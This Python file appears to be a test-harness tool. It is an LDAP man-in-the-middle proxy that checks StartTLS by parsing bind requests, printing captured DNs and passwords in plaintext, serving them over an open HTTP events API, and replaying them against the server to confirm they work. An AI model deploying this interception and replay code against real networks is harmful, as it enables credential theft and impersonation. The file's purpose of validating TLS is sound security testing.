#!/usr/bin/env python3
"""
LDAP MITM Proxy for TLS Verification - ADVERSARIAL EDITION

Acts as a network adversary to validate LDAP TLS security by attempting
to extract credentials from LDAP traffic. If credentials can be extracted,
TLS failed. If extraction fails (encrypted data), TLS succeeded.

Core functionality:
- Intercepts LDAP connections and forwards to real server
- Parses LDAP ASN.1/BER protocol to extract bind credentials
- Detects StartTLS requests and TLS handshakes
- Identifies connecting applications via reverse DNS
- Outputs structured JSON logs for automated parsing

Security validation model:
  proxy extracts working credentials → VULNERABILITY (plaintext transmission)
  proxy gets encrypted data only → SECURE (TLS working correctly)
"""

from __future__ import annotations

import argparse
import json
import logging
import socket
import sys
import threading
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum, auto
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from itertools import count
from typing import Final
from urllib.parse import parse_qs, urlparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
)
logger = logging.getLogger(__name__)


class SecurityVerdict(Enum):
    """Security assessment verdict for a connection."""

    SECURE = auto()
    VULNERABLE = auto()
    NO_BIND = auto()
    UNKNOWN = auto()


class LDAPProtocol:
    """LDAP protocol constants (RFC 4511)."""

    BIND_REQUEST: Final[bytes] = b"\x60"
    EXTENDED_REQUEST: Final[bytes] = b"\x77"
    STARTTLS_OID: Final[bytes] = b"1.3.6.1.4.1.1466.20037"
    TLS_HANDSHAKE_START: Final[bytes] = b"\x16\x03"

    ASN1_OCTET_STRING: Final[int] = 0x04
    ASN1_CONTEXT_SPECIFIC_0: Final[int] = 0x80


@dataclass
class TLSDetectionResult:
    """Thread-safe result of TLS detection analysis with rich metadata."""

    connection_id: int
    client_ip: str = ""
    client_port: int = 0
    application: str = "unknown"
    _starttls_requested: bool = field(default=False, repr=False)
    _tls_handshake_detected: bool = field(default=False, repr=False)
    _extracted_credentials: list[tuple[str, str]] = field(default_factory=list, repr=False)
    timestamp: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)

    @property
    def starttls_requested(self) -> bool:
        with self._lock:
            return self._starttls_requested

    @starttls_requested.setter
    def starttls_requested(self, value: bool) -> None:
        with self._lock:
            self._starttls_requested = value

    @property
    def tls_handshake_detected(self) -> bool:
        with self._lock:
            return self._tls_handshake_detected

    @tls_handshake_detected.setter
    def tls_handshake_detected(self, value: bool) -> None:
        with self._lock:
            self._tls_handshake_detected = value

    @property
    def extracted_credentials(self) -> list[tuple[str, str]]:
        with self._lock:
            return list(self._extracted_credentials)  # Return copy

    def add_credential(self, bind_dn: str, password: str) -> None:
        """Thread-safe credential addition."""
        with self._lock:
            self._extracted_credentials.append((bind_dn, password))

    @property
    def verdict(self) -> SecurityVerdict:
        """Determine security verdict for this connection."""
        with self._lock:
            if self._extracted_credentials:
                return SecurityVerdict.VULNERABLE
            if self._tls_handshake_detected:
                return SecurityVerdict.SECURE
            return SecurityVerdict.NO_BIND


class LDAPMITMProxy:
    """
    Man-in-the-middle proxy that validates LDAP TLS by attempting credential theft.

    Sits between LDAP clients and server, forwarding traffic while inspecting
    for plaintext credentials. Successfully extracted credentials prove TLS
    is not protecting authentication.

    Thread pool handles multiple concurrent connections without blocking.
    Each connection is analyzed for StartTLS usage and credential leakage.
    """

    EVENT_LOG_LIMIT: Final[int] = 1000
    SOCKET_TIMEOUT: Final[int] = 60  # Prevents hung connections

    def __init__(
        self,
        ldap_host: str,
        ldap_port: int,
        listen_port: int,
        max_workers: int = 10,
        api_host: str = "0.0.0.0",
        api_port: int = 8080,
    ) -> None:
        self.ldap_host = ldap_host
        self.ldap_port = ldap_port
        self.listen_port = listen_port
        self.api_host = api_host
        self.api_port = api_port

        self._connection_id_generator = count(1)  # Thread-safe counter
        self._results: dict[int, TLSDetectionResult] = {}
        self._results_lock = threading.Lock()  # Protects _results dict
        self._executor = ThreadPoolExecutor(max_workers=max_workers)
        self._event_log: list[dict] = []
        self._log_lock = threading.Lock()  # Protects _event_log
        self._http_server: ThreadingHTTPServer | None = None
        self._http_thread: threading.Thread | None = None

    def _identify_application(self, client_ip: str) -> str:
        """Identify application via reverse DNS lookup."""
        try:
            hostname, *_ = socket.gethostbyaddr(client_ip)
            hostname_lower = hostname.lower()

            # Order matters: more specific patterns first
            # Only STARTTLS traffic goes through this proxy (LDAPS connects directly)
            patterns = [
                ("anonymous-starttls", "phoenix-anonymous-starttls"),
                ("starttls", "phoenix-starttls"),
                ("grafana", "grafana-ldap"),
            ]

            for pattern, app_name in patterns:
                if pattern in hostname_lower:
                    return app_name

            return f"unknown({hostname})"

        except (socket.herror, socket.gaierror):
            return f"unknown({client_ip})"

    def get_events(self, since: float | None = None) -> list[dict]:
        """Return structured events, optionally filtered by timestamp."""
        with self._log_lock:
            events = list(self._event_log)
        if since is None:
            return events
        return [event for event in events if event.get("timestamp", 0) >= since]

    def _create_request_handler(self):
        """Create HTTP handler bound to this proxy instance."""
        proxy = self

        class RequestHandler(BaseHTTPRequestHandler):
            server_version = "LDAPMITMProxyAPI/1.0"

            def _send_json(self, payload: dict, status: int = 200) -> None:
                data = json.dumps(payload).encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):  # noqa: N802 - BaseHTTPRequestHandler requirement
                parsed = urlparse(self.path)

                if parsed.path == "/healthz":
                    self._send_json({"status": "ok"})
                    return

                if parsed.path != "/events":
                    self._send_json({"error": "Not Found"}, status=404)
                    return

                params = parse_qs(parsed.query or "")
                since = None
                if "since" in params:
                    try:
                        since = float(params["since"][0])
                    except (ValueError, TypeError):
                        self._send_json({"error": "Invalid 'since' parameter"}, status=400)
                        return

                self._send_json({"events": proxy.get_events(since)})

            def log_message(self, *args, **kwargs):  # noqa: D401,N803 - silence default logging
                """Silence default HTTP server logging."""
                return

        return RequestHandler

    def _start_api_server(self) -> None:
        """Start background HTTP API if not already running."""
        if self._http_server:
            return

        handler = self._create_request_handler()
        self._http_server = ThreadingHTTPServer((self.api_host, self.api_port), handler)

        self._http_thread = threading.Thread(
            target=self._http_server.serve_forever,
            name="LDAPMITMProxyAPI",
            daemon=True,
        )
        self._http_thread.start()
        logger.info(f"🌐 HTTP API available at http://{self.api_host}:{self.api_port}/events")

    def _shutdown_api_server(self) -> None:
        """Gracefully stop HTTP API server."""
        if not self._http_server:
            return

        self._http_server.shutdown()
        self._http_server.server_close()
        self._http_server = None

        if self._http_thread:
            self._http_thread.join(timeout=1)
            self._http_thread = None

    def _log_structured(self, event: str, conn_id: int, **kwargs) -> None:
        """Emit structured JSON log entry."""
        with self._results_lock:
            result = self._results.get(conn_id)
            application = result.application if result else "unknown"
            client_ip = result.client_ip if result else ""

        entry = {
            "timestamp": time.time(),
            "event": event,
            "connection_id": conn_id,
            "application": application,
            "client_ip": client_ip,
            **kwargs,
        }
        print(json.dumps(entry), flush=True)

        with self._log_lock:
            self._event_log.append(entry)
            if len(self._event_log) > self.EVENT_LOG_LIMIT:
                self._event_log.pop(0)

    @staticmethod
    def _parse_asn1_length(data: bytes, idx: int) -> tuple[int, int]:
        """Parse ASN.1 BER length encoding, return (length, new_idx)."""
        if idx >= len(data):
            raise IndexError("Unexpected end of data")

        length_byte = data[idx]
        idx += 1

        if length_byte & 0x80 == 0:
            # Short form: length is directly in this byte
            return length_byte, idx

        # Long form: lower 7 bits indicate number of length bytes
        num_length_bytes = length_byte & 0x7F
        if num_length_bytes == 0 or idx + num_length_bytes > len(data):
            raise IndexError("Invalid ASN.1 length encoding")

        length = int.from_bytes(data[idx : idx + num_length_bytes], "big")
        return length, idx + num_length_bytes

    def _parse_ldap_bind_credentials(self, data: bytes) -> tuple[str, str] | None:
        """
        Extract credentials from LDAP Simple Bind request (RFC 4513 §5.1.1).

        Returns (bind_dn, password) or None if extraction fails.
        This is an ADVERSARIAL operation simulating a real attacker.
        """
        try:
            idx = data.find(LDAPProtocol.BIND_REQUEST)
            if idx == -1:
                return None

            idx += 1
            # Skip bind request length
            _, idx = self._parse_asn1_length(data, idx)

            # Skip message ID (INTEGER)
            if idx >= len(data) or data[idx] != 0x02:
                return None
            idx += 1
            msg_id_len, idx = self._parse_asn1_length(data, idx)
            idx += msg_id_len

            # Parse DN (OCTET STRING)
            if idx >= len(data) or data[idx] != LDAPProtocol.ASN1_OCTET_STRING:
                return None
            idx += 1
            dn_length, idx = self._parse_asn1_length(data, idx)

            if idx + dn_length > len(data):
                return None

            bind_dn = data[idx : idx + dn_length].decode("utf-8", errors="ignore")
            idx += dn_length

            # Parse password (context-specific [0] for simple auth)
            if idx >= len(data) or data[idx] != LDAPProtocol.ASN1_CONTEXT_SPECIFIC_0:
                return None
            idx += 1
            pwd_length, idx = self._parse_asn1_length(data, idx)

            if idx + pwd_length > len(data):
                return None

            password = data[idx : idx + pwd_length].decode("utf-8", errors="ignore")

            return (bind_dn, password)

        except (IndexError, UnicodeDecodeError):
            return None

    def _inspect_traffic(
        self,
        data: bytes,
        result: TLSDetectionResult,
        direction: str,
    ) -> None:
        """Inspect traffic for security indicators."""
        # TLS handshake detection: only valid at START of chunk after STARTTLS
        # Checking anywhere in data could cause false positives if \x16\x03 appears
        # in regular LDAP data (e.g., binary attributes, passwords)
        if (
            data[:2] == LDAPProtocol.TLS_HANDSHAKE_START
            and result.starttls_requested
            and not result.tls_handshake_detected
        ):
            logger.info(f"[Connection {result.connection_id}] ✓ TLS handshake detected")
            self._log_structured(
                "tls_handshake_detected", result.connection_id, direction=direction
            )
            result.tls_handshake_detected = True

        if (
            LDAPProtocol.EXTENDED_REQUEST in data
            and LDAPProtocol.STARTTLS_OID in data
            and not result.starttls_requested
        ):
            logger.info(f"[Connection {result.connection_id}] ✓ StartTLS requested")
            self._log_structured("starttls_requested", result.connection_id, direction=direction)
            result.starttls_requested = True

        if (
            direction == "client→server"
            and not result.tls_handshake_detected
            and LDAPProtocol.BIND_REQUEST in data
        ):
            if credentials := self._parse_ldap_bind_credentials(data):
                bind_dn, password = credentials
                result.add_credential(bind_dn, password)

                logger.warning(
                    f"[Connection {result.connection_id}] "
                    f"🚨 CREDENTIALS STOLEN from {result.application}!"
                )
                logger.warning(f"    └─ DN: {bind_dn}")
                logger.warning(f"    └─ Password: {password}")

                self._log_structured(
                    "credentials_stolen",
                    result.connection_id,
                    bind_dn=bind_dn,
                    password=password,
                    password_length=len(password),
                    direction=direction,
                )

    def _forward_and_inspect(
        self,
        src: socket.socket,
        dst: socket.socket,
        conn_id: int,
        direction: str,
        stop_event: threading.Event,
    ) -> None:
        """Forward data while inspecting for TLS indicators."""
        with self._results_lock:
            result = self._results.get(conn_id)
        if not result:
            return

        try:
            while not stop_event.is_set():
                try:
                    chunk = src.recv(4096)
                    if not chunk:
                        break  # Connection closed cleanly
                    self._inspect_traffic(chunk, result, direction)
                    dst.sendall(chunk)
                except socket.timeout:
                    continue  # Check stop_event and retry
        except (ConnectionResetError, BrokenPipeError, OSError):
            pass  # Connection closed - normal termination
        finally:
            stop_event.set()  # Signal other thread to stop

    def _handle_connection(self, client_socket: socket.socket, conn_id: int) -> None:
        """Handle a single client connection with proper resource management."""
        # Set shorter timeout for recv() so threads can check stop_event
        client_socket.settimeout(5.0)
        stop_event = threading.Event()

        server_socket: socket.socket | None = None
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.settimeout(5.0)
            server_socket.connect((self.ldap_host, self.ldap_port))

            c2s_thread = threading.Thread(
                target=self._forward_and_inspect,
                args=(client_socket, server_socket, conn_id, "client→server", stop_event),
                daemon=True,
            )
            s2c_thread = threading.Thread(
                target=self._forward_and_inspect,
                args=(server_socket, client_socket, conn_id, "server→client", stop_event),
                daemon=True,
            )

            c2s_thread.start()
            s2c_thread.start()

            # Wait for either thread to finish (connection closed) or timeout
            c2s_thread.join(timeout=self.SOCKET_TIMEOUT)
            stop_event.set()  # Signal threads to stop
            s2c_thread.join(timeout=5.0)  # Short timeout for cleanup

        except socket.timeout:
            logger.warning(f"[Connection {conn_id}] Timeout - closing connection")
        except OSError as e:
            logger.error(f"[Connection {conn_id}] Connection error: {e}")
        finally:
            stop_event.set()  # Ensure threads stop
            # Close sockets after threads have been signaled
            try:
                client_socket.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            client_socket.close()
            if server_socket:
                try:
                    server_socket.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                server_socket.close()
            self._print_connection_summary(conn_id)
            # Clean up result to prevent memory leak (keep last 1000)
            self._cleanup_old_results()

    def _print_connection_summary(self, conn_id: int) -> None:
        """Print security assessment for completed connection."""
        with self._results_lock:
            result = self._results.get(conn_id)
        if not result:
            return
        verdict = result.verdict

        logger.info(f"\n[Connection {conn_id}] Security Analysis:")
        logger.info(f"  Application: {result.application}")
        logger.info(f"  Verdict: {verdict.name}")
        logger.info(f"  Credentials extracted: {len(result.extracted_credentials)}")

        if verdict == SecurityVerdict.VULNERABLE:
            logger.error("  🚨 VULNERABLE - Credentials transmitted in plaintext!")
        elif verdict == SecurityVerdict.SECURE:
            logger.info("  ✅ SECURE - TLS protected credentials")

        logger.info("")

        self._log_structured(
            "connection_closed",
            conn_id,
            verdict=verdict.name,
            credentials_extracted=len(result.extracted_credentials),
        )

    def start(self) -> None:
        """Start the proxy server with proper resource management."""
        self._start_api_server()

        with socket.create_server(("0.0.0.0", self.listen_port), reuse_port=True) as server:
            logger.info(f"🔍 LDAP MITM Proxy started on port {self.listen_port}")
            logger.info(f"   Forwarding to {self.ldap_host}:{self.ldap_port}\n")

            try:
                while True:
                    client_socket, (client_ip, client_port) = server.accept()

                    conn_id = next(self._connection_id_generator)

                    result = TLSDetectionResult(
                        connection_id=conn_id,
                        client_ip=client_ip,
                        client_port=client_port,
                        application=self._identify_application(client_ip),
                    )
                    with self._results_lock:
                        self._results[conn_id] = result

                    logger.info(f"\n[Connection {conn_id}] New from {client_ip}:{client_port}")
                    logger.info(f"[Connection {conn_id}] App: {result.application}")

                    self._log_structured(
                        "connection_established",
                        conn_id,
                        client_ip=client_ip,
                        client_port=client_port,
                    )

                    self._executor.submit(self._handle_connection, client_socket, conn_id)

            except KeyboardInterrupt:
                logger.info("\n🛑 Proxy stopped by user")
            finally:
                self._executor.shutdown(wait=True)
                self._shutdown_api_server()
                self.print_final_summary()

    def _cleanup_old_results(self) -> None:
        """Remove old results to prevent memory leak, keeping last 1000."""
        with self._results_lock:
            if len(self._results) > self.EVENT_LOG_LIMIT:
                # Keep only the most recent results
                sorted_ids = sorted(self._results.keys())
                for old_id in sorted_ids[: -self.EVENT_LOG_LIMIT]:
                    del self._results[old_id]

    def get_security_violations(self) -> list[TLSDetectionResult]:
        """Get all connections with security violations."""
        with self._results_lock:
            return [r for r in self._results.values() if r.extracted_credentials]

    def print_final_summary(self) -> None:
        """Print comprehensive security summary."""
        violations = self.get_security_violations()

        logger.info("\n" + "=" * 80)
        logger.info("🛡️  ADVERSARIAL SECURITY ASSESSMENT")
        logger.info("=" * 80)

        # Snapshot results under lock
        with self._results_lock:
            results_snapshot = list(self._results.values())

        app_stats: defaultdict[str, dict[str, int]] = defaultdict(
            lambda: {"total": 0, "vulnerable": 0, "secure": 0, "stolen": 0}
        )
        for result in results_snapshot:
            stats = app_stats[result.application]
            stats["total"] += 1
            if result.extracted_credentials:
                stats["vulnerable"] += 1
                stats["stolen"] += len(result.extracted_credentials)
            elif result.tls_handshake_detected:
                stats["secure"] += 1

        logger.info(f"\nTotal Connections: {len(results_snapshot)}")
        stolen_count = sum(len(r.extracted_credentials) for r in results_snapshot)
        logger.info(f"Credentials Stolen: {stolen_count}")
        logger.info(f"Secure Connections: {len(results_snapshot) - len(violations)}")

        logger.info("\n" + "─" * 80)
        logger.info("BY APPLICATION:")
        logger.info("─" * 80)

        for app, stats in sorted(app_stats.items()):
            status = "🚨 VULNERABLE" if stats["vulnerable"] > 0 else "✅ SECURE"
            logger.info(f"\n{app}: {status}")
            logger.info(f"  Total connections: {stats['total']}")
            logger.info(f"  Secure: {stats['secure']}")
            logger.info(f"  Vulnerable: {stats['vulnerable']}")
            logger.info(f"  Credentials stolen: {stats['stolen']}")

        if violations:
            logger.info("\n" + "=" * 80)
            logger.info("🚨 VULNERABILITY DETECTED - CREDENTIALS COMPROMISED!")
            logger.info("=" * 80)
            logger.info("\nAn adversary on the network successfully extracted credentials:")
            for result in violations:
                logger.info(f"\n  Connection {result.connection_id} ({result.application}):")
                for dn, pwd in result.extracted_credentials:
                    logger.info(f"    • DN: {dn}")
                    logger.info(f"    • Password: {pwd}")

            self._verify_stolen_credentials(violations)
        else:
            logger.info("\n✅ NO VULNERABILITIES - ALL CONNECTIONS SECURE")
            logger.info("═" * 80)
            logger.info("\nAdversary was unable to extract any credentials.")

        logger.info("\n" + "=" * 80)

    def _verify_stolen_credentials(self, violations: list[TLSDetectionResult]) -> None:
        """Verify that stolen credentials actually work."""
        try:
            from ldap3 import ALL, Connection, Server

            logger.info("\n" + "═" * 80)
            logger.info("🔐 CREDENTIAL VERIFICATION - Testing stolen passwords...")
            logger.info("═" * 80)

            unique_creds = {(dn, pwd) for r in violations for dn, pwd in r.extracted_credentials}
            server = Server(self.ldap_host, port=self.ldap_port, get_info=ALL)

            for dn, password in unique_creds:
                try:
                    conn = Connection(server, user=dn, password=password, auto_bind=True)
                    if conn.bound:
                        logger.info("\n  ✅ VERIFIED: Stolen credentials work!")
                        logger.info(f"     DN: {dn}")
                        logger.info(f"     Password: {password}")
                        logger.info("     → Attacker can impersonate this identity")
                        conn.unbind()
                except Exception as e:
                    logger.error(f"\n  ❌ FAILED: {dn} - {e}")

        except ImportError:
            logger.warning("\n  ⚠️  ldap3 not available - cannot verify credentials")
        except Exception as e:
            logger.error(f"\n  ⚠️  Verification error: {e}")


def main() -> int:
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="Adversarial LDAP MITM Proxy",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--ldap-host", default="ldap", help="LDAP server hostname")
    parser.add_argument("--ldap-port", type=int, default=389, help="LDAP server port")
    parser.add_argument("--listen-port", type=int, default=3389, help="Proxy listen port")
    parser.add_argument("--max-workers", type=int, default=10, help="Thread pool size")
    parser.add_argument("--api-host", default="0.0.0.0", help="HTTP API host")
    parser.add_argument("--api-port", type=int, default=8080, help="HTTP API port")
    args = parser.parse_args()

    proxy = LDAPMITMProxy(
        ldap_host=args.ldap_host,
        ldap_port=args.ldap_port,
        listen_port=args.listen_port,
        max_workers=args.max_workers,
        api_host=args.api_host,
        api_port=args.api_port,
    )

    try:
        proxy.start()
    except KeyboardInterrupt:
        return 0

    return 1 if proxy.get_security_violations() else 0


if __name__ == "__main__":
    sys.exit(main())
